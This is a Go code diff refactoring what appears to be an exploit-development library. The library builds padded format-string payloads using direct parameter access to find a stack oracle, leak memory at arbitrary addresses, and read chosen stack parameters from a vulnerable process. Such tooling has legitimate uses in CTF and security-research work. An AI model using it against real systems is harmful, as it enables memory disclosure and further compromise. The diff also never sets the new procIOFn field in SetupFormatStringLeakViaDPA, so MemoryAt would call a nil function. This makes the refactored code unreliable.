@@ -13,14 +13,14 @@ type ProcessIO interface {
 	ReadUntil(p []byte) ([]byte, error)
 }
 
-type FormatStringDirectParamConfig struct {
+type FormatStringDPAConfig struct {
 	ProcessIOFn  func() ProcessIO
 	MaxNumParams int
 	PointerSize  int
 	Verbose      *log.Logger
 }
 
-func (o FormatStringDirectParamConfig) validate() error {
+func (o FormatStringDPAConfig) validate() error {
 	if o.ProcessIOFn == nil {
 		return fmt.Errorf("get process function cannot be nil")
 	}
@@ -36,15 +36,15 @@ func (o FormatStringDirectParamConfig) validate() error {
 	return nil
 }
 
-func LeakUsingFormatStringDirectParamOrExit(config FormatStringDirectParamConfig) *FormatStringMemoryLeaker {
-	f, err := LeakUsingFormatStringDirectParam(config)
+func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStringLeaker {
+	f, err := SetupFormatStringLeakViaDPA(config)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to create format string param memory leaker - %w", err))
+		defaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
 	}
 	return f
 }
 
-type directParamAccessFormatString struct {
+type dpaFormatString struct {
 	info        formatStringInfo
 	paramNumber int
 }
@@ -55,11 +55,11 @@ type formatStringInfo struct {
 	endOfStringDelim []byte
 }
 
-func (o directParamAccessFormatString) paddedTo(finalStrLen int) []byte {
+func (o dpaFormatString) paddedTo(finalStrLen int) []byte {
 	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
 }
 
-func (o directParamAccessFormatString) withoutPadding() []byte {
+func (o dpaFormatString) withoutPadding() []byte {
 	buff := bytes.NewBuffer(nil)
 	buff.Write(o.info.leakedDataSep)
 	buff.WriteString("%")
@@ -71,13 +71,35 @@ func (o directParamAccessFormatString) withoutPadding() []byte {
 	return buff.Bytes()
 }
 
-func LeakUsingFormatStringDirectParam(config FormatStringDirectParamConfig) (*FormatStringMemoryLeaker, error) {
+func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
+	formatString, err := createDPAFormatStringLeakWithLastValueAsArg(config)
+	if err != nil {
+		return nil, err
+	}
+
+	formatString.info.specifierChar = 's'
+	unpaddedStr := formatString.withoutPadding()
+	finalPaddedFormatStr := prependStringWithCharUntilLen(
+		unpaddedStr,
+		'A',
+		stackAlignedLen(unpaddedStr, config.PointerSize))
+
+	return &FormatStringLeaker{
+		formatStr: finalPaddedFormatStr,
+		info:      formatString.info,
+	}, nil
+}
+
+// In the future, this could be used to setup a write-what-where format
+// string. This function was created by accident (it could have remained
+// a part of the original function).
+func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (*dpaFormatString, error) {
 	err := config.validate()
 	if err != nil {
 		return nil, err
 	}
 
-	formatStringConfig := directParamAccessFormatString{
+	formatString := dpaFormatString{
 		paramNumber: 0,
 		info:        formatStringInfo{
 			leakedDataSep:    []byte("|"),
@@ -95,76 +117,159 @@ func LeakUsingFormatStringDirectParam(config FormatStringDirectParamConfig) (*Fo
 	// which will make finding the oracle very difficult.
 	//
 	// Set to max for str len calculation.
-	formatStringConfig.paramNumber = config.MaxNumParams
-	fmtStringLen := formatStringStackAlignedLen(
-		formatStringConfig.withoutPadding(),
+	formatString.paramNumber = config.MaxNumParams
+	fmtStringStackAlignedLen := stackAlignedLen(
+		formatString.withoutPadding(),
 		config.PointerSize)
 
 	if config.Verbose != nil {
 		config.Verbose.Printf("format string config: %+v\nlen: %d\nstring w/o padding: '%s'",
-			formatStringConfig, fmtStringLen, formatStringConfig.withoutPadding())
+			formatString, fmtStringStackAlignedLen, formatString.withoutPadding())
 	}
 
-	oracle := strings.Repeat("A", 8)
+	// TODO: Randomize oracle string instead of A's.
+	oracle := strings.Repeat("A", config.PointerSize)
 	// TODO: Some platforms do not include '0x' in the format
 	//  function's output.
 	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))
 
 	i := 0
 	for ; i < config.MaxNumParams; i++ {
-		formatStringConfig.paramNumber = i
-
-		str := append(formatStringConfig.paddedTo(fmtStringLen), oracle...)
-		if config.Verbose != nil {
-			config.Verbose.Printf("iteration %d writing: '%s'...", i, str)
-		}
+		formatString.paramNumber = i
 
 		addressFromFormatFunc, err := leakDataWithFormatString(
 			config.ProcessIOFn(),
-			str,
-			formatStringConfig.info)
+			append(formatString.paddedTo(fmtStringStackAlignedLen), oracle...),
+			formatString.info)
 		if err != nil {
 			return nil, err
 		}
 
-		if config.Verbose != nil {
-			config.Verbose.Printf("read: '%s'", addressFromFormatFunc)
-		}
-
 		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
-			formatStringConfig.info.specifierChar = 's'
-			finalPaddedFormatStr := formatStringConfig.paddedTo(fmtStringLen)
-
-			if len(finalPaddedFormatStr) != fmtStringLen {
-				return nil, fmt.Errorf("final format string length should be %d bytes, it is %d bytes",
-					fmtStringLen, len(finalPaddedFormatStr))
-			}
-
-			return &FormatStringMemoryLeaker{
-				formatStr: finalPaddedFormatStr,
-				info:      formatStringConfig.info,
-			}, nil
+			return &formatString, nil
 		}
 	}
 
 	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
 }
 
-type FormatStringMemoryLeaker struct {
+type FormatStringLeaker struct {
 	formatStr []byte
 	info      formatStringInfo
+	procIOFn  func() ProcessIO
 }
 
-func (o FormatStringMemoryLeaker) MemoryAtOrExit(pointer Pointer, processIO ProcessIO) []byte {
-	p, err := o.MemoryAt(pointer, processIO)
+func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
+	p, err := o.MemoryAt(pointer)
 	if err != nil {
 		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
 	}
 	return p
 }
 
-func (o FormatStringMemoryLeaker) MemoryAt(pointer Pointer, processIO ProcessIO) ([]byte, error) {
-	return leakDataWithFormatString(processIO, append(o.formatStr, pointer...), o.info)
+func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
+	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.info)
+}
+
+func NewFormatStringDPALeakerOrExit(config FormatStringDPAConfig) *FormatStringDPALeaker {
+	res, err := NewFormatStringDPALeaker(config)
+	if err != nil {
+		defaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
+	}
+	return res
+}
+
+func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALeaker, error) {
+	err := config.validate()
+	if err != nil {
+		return nil, err
+	}
+
+	formatString := dpaFormatString{
+		info:        formatStringInfo{
+			leakedDataSep:    []byte("|"),
+			specifierChar:    'p',
+			endOfStringDelim: []byte("foozlefu"),
+		},
+		paramNumber: config.MaxNumParams,
+	}
+
+	// Get the maximum length of the format string, and
+	// calculate the number of bytes required to keep
+	// it aligned on the stack.
+	paddedLen := stackAlignedLen(formatString.withoutPadding(), config.PointerSize)
+	formatString.paramNumber = 0
+
+	return &FormatStringDPALeaker{
+		config:    config,
+		paddedLen: paddedLen,
+		dpaSting:  formatString,
+	}, nil
+}
+
+type FormatStringDPALeaker struct {
+	config    FormatStringDPAConfig
+	paddedLen int
+	dpaSting  dpaFormatString
+}
+
+func (o FormatStringDPALeaker) FindParamNumberOrExit(target []byte) (int, bool) {
+	i, b, err := o.FindParamNumber(target)
+	if err != nil {
+		defaultExitFn(err)
+	}
+	return i, b
+}
+
+func (o FormatStringDPALeaker) FindParamNumber(target []byte) (int, bool, error) {
+	for i := 0; i < o.config.MaxNumParams; i++ {
+		result, err := o.MemoryAtParam(i)
+		if err != nil {
+			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
+				i, err)
+		}
+
+		if o.config.Verbose != nil {
+			o.config.Verbose.Printf("FindParamNumber read: '%s'", result)
+		}
+
+		if bytes.Equal(target, result) {
+			if o.config.Verbose != nil {
+				o.config.Verbose.Printf("FindParamNumber found target: '%s'", target)
+			}
+			return i, true, nil
+		}
+	}
+
+	return 0, false, nil
+}
+
+func (o FormatStringDPALeaker) MemoryAtParamOrExit(paramNumber int) []byte {
+	res, err := o.MemoryAtParam(paramNumber)
+	if err != nil {
+		defaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
+	}
+	return res
+}
+
+func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
+	if paramNumber > o.config.MaxNumParams {
+		// This is a problem because it may potentially shift
+		// the arguments on the stack, and make the result
+		// of the format string function unpredictable.
+		return nil, fmt.Errorf("requested parameter number %d exceeds maximum params of %d",
+			paramNumber, o.config.MaxNumParams)
+	}
+
+	o.dpaSting.paramNumber = paramNumber
+	strWithoutPadding := o.dpaSting.withoutPadding()
+
+	stackAlignedStr := prependStringWithCharUntilLen(
+		strWithoutPadding,
+		'A',
+		o.paddedLen)
+
+	return leakDataWithFormatString(o.config.ProcessIOFn(), stackAlignedStr, o.dpaSting.info)
 }
 
 func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringInfo) ([]byte, error) {
@@ -175,7 +280,7 @@ func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatSt
 
 	token, err := process.ReadUntil(info.endOfStringDelim)
 	if err != nil {
-		return nil, fmt.Errorf("failed to format string end of string delim from process - %w", err)
+		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
 	}
 
 	firstSepIndex := bytes.Index(token, info.leakedDataSep)
@@ -192,16 +297,16 @@ func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatSt
 	return lineWithoutFirstSep[0:lastSepIndex], nil
 }
 
-func formatStringStackAlignedLen(finalFormatString []byte, pointerSizeBytes int) int {
-	maxFormatStringLen := len(finalFormatString)
-	paddLen := 0
+func stackAlignedLen(stringWithoutPadding []byte, pointerSizeBytes int) int {
+	maxStringLen := len(stringWithoutPadding)
+	padLen := 0
 	for {
-		if (maxFormatStringLen + paddLen) % pointerSizeBytes == 0 {
+		if (maxStringLen + padLen) % pointerSizeBytes == 0 {
 			break
 		}
-		paddLen++
+		padLen++
 	}
-	return paddLen + maxFormatStringLen
+	return padLen + maxStringLen
 }
 
 func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
